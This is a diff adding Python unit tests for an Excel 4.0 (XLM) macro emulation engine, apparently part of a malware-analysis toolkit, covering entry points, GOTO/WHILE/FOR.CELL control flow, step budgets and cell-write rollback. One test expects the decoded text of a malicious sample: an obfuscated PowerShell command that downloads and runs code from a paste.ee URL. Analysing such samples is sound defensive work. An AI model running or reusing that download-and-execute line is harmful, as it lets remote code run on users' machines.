@@ -1,0 +1,272 @@
+from __future__ import annotations
+
+import io
+import re
+import zipfile
+
+from refinery.lib.excel import synthesize_formula
+from refinery.lib.scripts.xlm import XlmCursor, XlmEngine, XlmReference, XlmView
+from refinery.lib.scripts.xlm.trace import XlmSeverity, XlmStatus
+from test import TestBase
+from test.lib.excel.samples import (
+    XLM_MACRO_ASSIGN_BIFF8,
+    XLM_MACRO_FORMULA_XLSM,
+    XLM_MACRO_NAMES_BIFF8,
+    XLM_MACRO_RPN_BIFF8,
+    XLM_MACRO_TEXT_XLSM,
+)
+
+_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'
+
+_MACROSHEET_PART = 'xl/macrosheets/intlsheet1.xml'
+
+
+def _macrosheet(view: XlmView, name: str):
+    sheet = view.macrosheet(name)
+    assert sheet is not None
+    return sheet
+
+
+def _with_cell_formula(data: bytes, cell: str, formula: str) -> bytes:
+    """
+    Replace the stored formula of one cell of the macrosheet of the XLSM sample with another.
+    """
+    source = zipfile.ZipFile(io.BytesIO(data))
+    buffer = io.BytesIO()
+    pattern = re.compile(F'(<c r="{cell}"[^>]*>)<f>.*?</f>'.encode(), re.DOTALL)
+    with zipfile.ZipFile(buffer, 'w') as target:
+        for info in source.infolist():
+            content = source.read(info)
+            if info.filename == _MACROSHEET_PART:
+                content = pattern.sub(
+                    lambda match: match.group(1) + F'<f>{formula}</f>'.encode(),
+                    content,
+                    count=1,
+                )
+            target.writestr(info, content)
+    return buffer.getvalue()
+
+
+def _run(*replacements: tuple[str, str], **options):
+    data = XLM_MACRO_TEXT_XLSM
+    for cell, formula in replacements:
+        data = _with_cell_formula(data, cell, formula)
+    engine = XlmEngine(XlmView(data), **options)
+    return list(engine.run()), engine
+
+
+def _steps(*replacements: tuple[str, str], **options) -> list:
+    return _run(*replacements, **options)[0]
+
+
+class TestXlmEngineEntries(TestBase):
+
+    _ANCHORS = [
+        (XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 41, 19),
+        (XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1),
+        (XLM_MACRO_ASSIGN_BIFF8, 'sod', 25268, 148),
+        (XLM_MACRO_TEXT_XLSM, 'Doc1', 109, 52),
+        (XLM_MACRO_FORMULA_XLSM, 'PCWV', 8, 7),
+    ]
+
+    def test_every_run_starts_at_the_fall_through_anchor_of_its_entry_name(self):
+        for data, sheet, row, col in self._ANCHORS:
+            with self.subTest(sheet=sheet):
+                steps = list(XlmEngine(XlmView(data)).run())
+                self.assertNotEqual(steps, [])
+                self.assertEqual(
+                    (steps[0].sheet, steps[0].row, steps[0].col),
+                    (sheet, row, col),
+                )
+
+    def test_the_run_of_the_maldoc_starts_at_its_program(self):
+        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
+        self.assertEqual(
+            (steps[0].sheet, steps[0].row, steps[0].col, steps[0].text),
+            ('Tiposa', 25, 7, 'GOTO(Vtreytr!F17)'),
+        )
+
+
+class TestXlmEngineTraces(TestBase):
+
+    def test_the_names_sample_answers_one_partial_step(self):
+        steps = list(XlmEngine(XlmView(XLM_MACRO_NAMES_BIFF8)).run())
+        self.assertEqual(len(steps), 1)
+        self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
+        self.assertEqual(
+            steps[0].text,
+            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
+            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\'):'
+            'IEX (new`-OB`jeCT(\'Net.WebClient\')).'
+            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
+        )
+
+    def test_the_rpn_sample_walks_its_column_one_row_at_a_time(self):
+        steps = list(XlmEngine(XlmView(XLM_MACRO_RPN_BIFF8)).run())
+        self.assertEqual([(step.sheet, step.row, step.col) for step in steps], [
+            ('mP9mScF1m5', row, 19) for row in range(41, 52)
+        ])
+        self.assertEqual(
+            [step.status for step in steps],
+            [XlmStatus.PartialEvaluation] * 10 + [XlmStatus.FullEvaluation],
+        )
+        self.assertEqual(steps[10].severity, XlmSeverity.JUMP)
+        self.assertEqual(steps[10].text, 'GOTO(T1)')
+
+    def test_the_assign_sample_runs_the_cell_calls_the_old_parser_could_not_read(self):
+        steps = list(XlmEngine(XlmView(XLM_MACRO_ASSIGN_BIFF8)).run())
+        self.assertNotEqual(steps, [])
+        self.assertEqual(
+            (steps[0].row, steps[0].col, steps[0].text),
+            (25268, 148, '$DQ$42603()'),
+        )
+        self.assertEqual((steps[1].row, steps[1].col), (42603, 121))
+        self.assertEqual(steps[-1].status, XlmStatus.End)
+        self.assertEqual(steps[-1].text, 'HALT()')
+
+    def test_the_maldoc_run_ends_at_its_return(self):
+        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
+        self.assertEqual(
+            [step.status for step in steps if step.status is XlmStatus.Error],
+            [],
+        )
+        self.assertEqual(
+            (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].text),
+            ('Tiposa1', 30, 7, 'RETURN()'),
+        )
+
+
+class TestXlmEngineControl(TestBase):
+
+    def test_a_goto_moves_execution_to_the_address_it_names(self):
+        steps = _steps(('AZ110', 'GOTO(AZ118)'))
+        self.assertEqual(
+            [(step.row, step.col) for step in steps],
+            [(109, 52), (110, 52), (118, 52), (120, 52), (121, 52)],
+        )
+        self.assertEqual(steps[1].severity, XlmSeverity.JUMP)
+        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)
+
+    def test_a_goto_that_jumps_to_itself_terminates_by_loop_detection(self):
+        steps = _steps(('AZ110', 'GOTO(AZ110)'))
+        self.assertEqual(steps[0].row, 109)
+        self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
+        self.assertEqual([step.text for step in steps[1:]], ['GOTO(AZ110)'] * 19)
+        self.assertEqual(
+            [step.status for step in steps[1:]],
+            [XlmStatus.FullEvaluation] * 19,
+        )
+
+    def test_a_while_whose_condition_does_not_hold_ignores_the_rest_of_the_column(self):
+        steps = _steps(('AZ110', 'WHILE(FALSE)'))
+        self.assertEqual(
+            [(step.row, step.col) for step in steps],
+            [
+                (109, 52), (110, 52), (112, 52), (113, 52),
+                (114, 52), (115, 52), (116, 52), (121, 52),
+            ],
+        )
+        self.assertEqual(steps[1].text, 'WHILE(FALSE)')
+        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)
+        self.assertEqual(steps[1].severity, XlmSeverity.IMPORTANT)
+
+    def test_a_for_cell_loop_walks_its_range_until_its_next_falls_through(self):
+        steps, engine = _run(
+            ('AZ110', 'FOR.CELL("counter",AZ109:AZ112)'),
+            ('AZ112', 'NEXT()'),
+        )
+        self.assertEqual(
+            [(step.row, step.col) for step in steps],
+            [
+                (109, 52),
+                (110, 52), (112, 52),
+                (110, 52), (112, 52),
+                (110, 52), (112, 52),
+                (110, 52),
+                (113, 52), (114, 52), (115, 52), (116, 52),
+                (118, 52), (120, 52), (121, 52),
+            ],
+        )
+        entry = engine.view.names.resolve('counter')
+        assert entry is not None and entry.formula is not None
+        self.assertEqual(synthesize_formula(entry.formula), 'Doc1!$AZ$112')
+
+    def test_a_partial_condition_branches_into_both_arms_in_turn(self):
+        steps = _steps(('AZ110', 'IF(AZ112,1+1,2+2)'))
+        self.assertEqual(steps[1].status, XlmStatus.FullBranching)
+        self.assertEqual(steps[1].text, 'IF(AZ112,1+1,2+2)')
+        self.assertEqual(steps[2].text, '[TRUE] 2')
+        self.assertEqual(steps[3].row, 112)
+        self.assertEqual(steps[11].text, '[FALSE] 4')
+        self.assertEqual(steps[12].row, 112)
+        self.assertEqual(steps[-1].row, 121)
+
+    def test_a_run_that_exceeds_its_step_budget_ends_with_an_error_step(self):
+        steps = _steps(
+            ('AZ110', 'WHILE(TRUE)'),
+            ('AZ112', 'NEXT()'),
+            max_steps=10,
+        )
+        self.assertEqual(len(steps), 11)
+        self.assertEqual(steps[-1].status, XlmStatus.Error)
+        self.assertEqual(steps[-1].text, 'step budget of 10 exhausted')
+        self.assertEqual(steps[-2].text, 'WHILE(TRUE) -> [True]')
+
+
+class TestXlmEngineJournal(TestBase):
+
+    def test_a_cell_the_program_writes_is_visible_to_the_fall_through(self):
+        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
+        cursor = XlmCursor('Doc1', 116, 52)
+        self.assertEqual(
+            engine.next_formula_cell(cursor),
+            XlmCursor('Doc1', 118, 52),
+        )
+        position = engine.snapshot()
+        engine.write_cell(XlmReference('Doc1', 117, 52), '=HALT()', cursor)
+        self.assertEqual(
+            engine.next_formula_cell(cursor),
+            XlmCursor('Doc1', 117, 52),
+        )
+        engine.rollback(position)
+        self.assertEqual(
+            engine.next_formula_cell(cursor),
+            XlmCursor('Doc1', 118, 52),
+        )
+
+    def test_a_rollback_removes_a_cell_the_rolled_back_writes_created(self):
+        view = XlmView(XLM_MACRO_TEXT_XLSM)
+        engine = XlmEngine(view)
+        position = engine.snapshot()
+        engine.write_cell(XlmReference('Doc1', 200, 52), '=1+1', XlmCursor('Doc1', 1, 1))
+        created = _macrosheet(view, 'Doc1').cell(200, 52)
+        assert created is not None
+        self.assertEqual(created.value, '=1+1')
+        self.assertEqual(
+            engine.read_reference(
+                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
+            ).value,
+            2,
+        )
+        engine.rollback(position)
+        self.assertEqual(_macrosheet(view, 'Doc1').cell(200, 52), None)
+        self.assertEqual(
+            engine.read_reference(
+                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
+            ).value,
+            None,
+        )
+
+    def test_a_rollback_restores_the_value_and_formula_of_an_overwritten_cell(self):
+        view = XlmView(XLM_MACRO_TEXT_XLSM)
+        engine = XlmEngine(view)
+        cell = view.cell('Doc1', 109, 52)
+        assert cell is not None
+        self.assertEqual((cell.value, cell.formula is None), (False, False))
+        position = engine.snapshot()
+        engine.write_cell(XlmReference('Doc1', 109, 52), 'changed', XlmCursor('Doc1', 1, 1))
+        self.assertEqual((cell.value, cell.formula), ('changed', None))
+        engine.write_value(cell, 7)
+        self.assertEqual(cell.value, 7)
+        engine.rollback(position)
+        self.assertEqual((cell.value, cell.formula is None), (False, False))
